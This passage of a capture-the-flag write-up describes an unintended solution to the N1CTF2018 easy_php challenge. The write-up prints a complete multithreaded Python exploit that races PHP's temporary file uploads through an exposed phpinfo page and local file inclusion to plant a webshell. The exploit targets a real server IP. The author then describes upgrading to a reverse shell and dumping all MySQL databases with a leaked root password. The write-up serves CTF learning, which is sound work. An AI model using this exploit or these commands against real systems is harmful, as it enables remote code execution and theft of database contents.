            $ip = @file_get_contents("http://ip.taobao.com/service/getIpInfo.php?ip=".$this->ip);
            $ip = json_decode($ip,true);
            return $ip['data']['country'];
        }
        public function getsubtime()
        {
            $now_date = time();
            $sub_date = (int)$now_date - (int)$this->date;
            $days = (int)($sub_date/86400);
            $hours = (int)($sub_date%86400/3600);
            $minutes = (int)($sub_date%86400%3600/60);
            $res = ($days>0)?"$days days $hours hours $minutes minutes ago":(($hours>0)?"$hours hours $minutes minutes ago":"$minutes minutes ago");
            return $res;
        }
    }
    $_POST['mood'] = 1;
    $mood = addslashes(serialize(new Mood((int)$_POST['mood'],"127.0.0.1")));
    #$mood = serialize(new Mood((int)$_POST['mood'],"127.0.0.1"));
    echo $mood;  
    // $mood = unserialize($mood);
    // $country = $mood->getcountry();
    // print $country;
    ?>
..and confirmed that I only can control the mood id, that one converted to
integer before to get inside the serialized object. Again, no injection
because the conversion.
#### XSS? SSRF?
Maybe there a PhantomJS or some script browsing to my publications?
> If we are able to trigger a **SSRF** , I was able to craft a POST and set my
> user as **is_admin=1**!
Nope, we have the Dockerfile showing every system changes, and leaked a lot of
things that indicate this is not happening. Also there's a `htmlentities()`
and other things filtering our XSS tries, and `javascript:` didn't work
outside a ``.
## Emulating locally the remote environment
After a lot of frustrated tries, we decided to move back to enumeration
searching another attack vector.
So, Dockerfile shows us that they used a **public repository** to create the
base system for this challenge.
I pulled this to my machine, sync'd everything, got a rootshell on it and
started the Container enumeration.
The only things that I cannot sync was of course the `ADD nu1lctf.tar.gz
/app/` and  
`COPY sql.sql /tmp/sql.sql` containing the challenge data.
# Unintend way to RCE/Flag
Checking the environment we noticed that the challenger made a
mistake(intentionally probably) while removing the `/var/www/phpinfo` folder
on `/run.sh` script.
He missed the `-r` and it will leave the folder on environment w/ all its
contents!
Nice! Different from that useless `/app/views/phpinfo` that are running over
command-line, now we have this `phpinfo();` that we can reach directly from
web server and interprets our `GET` and `POST requests`!
#### And, why this `phpinfo()` is dangerous?
Remember the challenge description:
    Not racing, just enjoying the slow pace of life :)
I do not like the slow pace of life and decided to try a well known race
condition exploit on it.
  * [PHP LFI to arbitratry code execution via rfc1867 file upload temporary files](http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf)
[Gynvael Coldwind](https://twitter.com/gynvael?lang=en) wrote this awesome
paper about a Race Condition that can be exploited abusing the PHP File Upload
function. Btw our **php5.5.9** is vulnerable to this issue.
In order to exploit this we need to launch a `multi-thread` script to `flood
the PHP Job queue w/ junk` and we have a `little time window` to `access this
temporary created files` before it was automatically deleted.
> The random_value is later written as 6 digits of k=62 (A-Za-z0-9 charset)
> numeric system, and appended to the "/tmp/php" prefix (unless another
> directory is set),  
>  e.g. /tmp/phpUs7MxA. -- Gynvael
Also found this another paper from
[PI:EMAIL](mailto:%PI:EMAIL):
  * [LFI with PHPInfo assitance (includes PoC)](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)
I tried to use the **Insomniasec PoC** described on paper but no success,
maybe because some chinese server conditions and settings, I don't know what
happened.
Instead of troubleshooting that PoC and to learn a new thing, following the
**Gynvael** and **Insomniasec** papers we decided to write a new exploit from
scratch troubleshooting every step on my local docker environment.
## Final exploit
    ## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit 
    # Alternative way to easy_php @ N1CTF2018, solved by intrd & shrimpgo - p4f team
    # @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/
    ## passwords.txt payload content
    # ');?>
    import sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re
    from subprocess import Popen, PIPE, STDOUT
    NumOfThreads=50
    queue = Queue.Queue()
    class checkHash(threading.Thread):
        def __init__(self,queue):
            threading.Thread.__init__(self)
            self.queue=queue
        def run(self):
            i=0
            while True:
                self.clear=self.queue.get()
                passtry = self.clear
                if passtry != "":
                    padding="A" * 5000
                    cookies = {
                        'PHPSESSID': 'o99quh47clk8br394298tkv5o0',
                        'othercookie': padding
                    }
                    headers = {
                        'User-Agent': padding,
                        'Pragma': padding,
                        'Accept': padding,
                        'Accept-Language': padding,
                        'DNT': '1'
                    }
                    files = {'arquivo': open('passwords.txt','rb')}
                    reqs='http://47.97.221.96:23333/index.php?action=../../var/www/phpinfo/index.php&a='+padding
                    #reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&a='+padding
                    response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=False)
                    data = response.content
                    data = re.search(r"(? ).*", data).group(0)
                    print data
                    reqs = 'http://47.97.221.96:23333/index.php?action=../..'+data
                    #reqs = 'http://172.17.0.2:80/index.php?action=../..'+data
                    print reqs
                    response = requests.get(reqs, verify=False)
                    data = response.content
                    print data
                i+=1
                self.queue.task_done()
    for i in range(NumOfThreads):
        t=checkHash(queue)
        t.setDaemon(True)
        t.start()
    for x in range(0, 9999):
        x=str(x)
        queue.put(x.strip())
    queue.join()
[view
raw](https://gist.github.com/intrd/35483ae252c66ee3d11f7acfa7379749/raw/76488b0d95a9fd7e5a2bd3c8bbc929a45590238f/phpinfo_exploit.py)[phpinfo_exploit.py](https://gist.github.com/intrd/35483ae252c66ee3d11f7acfa7379749#file-phpinfo_exploit-py) hosted with ❤ by [GitHub](https://github.com/)
The idea behind this code is generate a lot of junk on headers, cookies, uri
and POST all the shit including your `payload.txt` to the phpinfo endpoint.
If the File Upload work, the `phpinfo()` will respond with the `temporary file
path`.
You aren't fast enough to access this file before it was processed/deleted by
PHP. But the multi-thread script are!
This is the _payload_ that will be executed if some thread are fast enought to
hit.
    ');?>
It will create `/app/intrd`, a webshell that we have access though LFI!
I choose this path because I'm sure this is writable:
But remember..  
We are not at an advantage in this race.
There are a fucking `rm -rf /tmp/*;` running `every 2 seconds` on the system.
We have the worst scenario possible:
  * This job deleting everything on /tmp every 2s;
  * PHP deleting temporary files after processing.
  * Chinese server - Other side of the world for me (Brazil);
  * Lot of players bruteforcing the application turning the response insanely slow.
Anyway, why not give a try?
So, I launched my exploit locally.
While the Race Condition exploit are running w/ `50 threads`, I keep checking
the existence of my webshell at `/app/intrd`.
And, after a few minutes, it worked like a charm! We got our RCE at the
controlled environment.
### China number one
So, when I tried the exploit remote I have not had the same luck `:(`.
Of course the Chinese server are too far from me, and the brazilian ISP sucks
a lot, `tracert` indicates that there's a single Embratel node sucking more
than 200ms, ending w/ the total ping response `650ms+`.
But it become personal, we would not give up at this point.
So we decided to shorten the distance and travel (virtually) near to China!
Thanks [DigitalOcean](https://m.do.co/c/d9e7f6bd0a56)!
`350ms` now i'm ok to launch my exploit from a VPS hosted on `Bagalore`!
And after about 1 hour trying, finally got my webshell written to the `/app`
folder.
I think the players loading the server's CPU with bruteforce shit helped me a
lot slow-ling the php queue this time.
I quickly upgrade this RCE to a reverse shell.
### Where's the flag?
So, knowing the docker environment, and excluding the nu1lctf.tar.gz content,
that at this point we had already been digging into everything. My bet was the
MySQL database.
Remember the `mysql root password` leaked on the beginning? I used this to
`dump all the databases to a file` and **greped** for the flag prefix.
    mysqldump -uroot -pNu1Lctf\%\#~\:p --all-databases > /app/intdbs.sql
A HUGE win!  
Also, the flag text confirmed the intended way was that first path we were
following.
**PHP unserialize + SSRF + CRLF Injection** , Jesus, we have no time to learn
this today. Hey, Easy? :p
Learned a lot in a single chall.
Awesome CTF [Nu1L .Cyberpeace](http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/n1ctf.xctf.org.cn/), unfortunately we did not have time to
try the other challenges but I'm sure they were as well developed as this one!
And thanks @[shrimpgo](https://www.linkedin.com/in/renatocarneirop/), awesome
team up and brainstorms!
# UPDATE: Expected solution (PHP unserialize + SSRF + CRLF Injection)
  * [ezphp - official writeup](http://wupco.cn/hctf/ezphp.pdf) by wupcode (admin)